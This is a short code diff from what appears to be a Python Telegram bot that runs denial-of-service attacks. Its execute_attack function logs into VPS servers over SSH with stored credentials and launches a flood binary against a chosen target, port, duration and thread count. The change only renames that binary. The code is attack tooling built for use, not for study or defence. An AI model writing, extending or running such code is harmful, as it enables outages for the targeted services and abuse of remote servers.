@@ -208,7 +208,7 @@ def handle_when(chat_id):
 def execute_attack(vps, target, port, duration, threads, chat_id):
     """Execute an attack on the target using the selected VPS."""
     ip, user, password = vps["ip"], vps["user"], vps["password"]
-    attack_command = f"./vikku {target} {port} {duration} {threads}"
+    attack_command = f"./tagdi {target} {port} {duration} {threads}"
 
     try:
         ssh = paramiko.SSHClient()
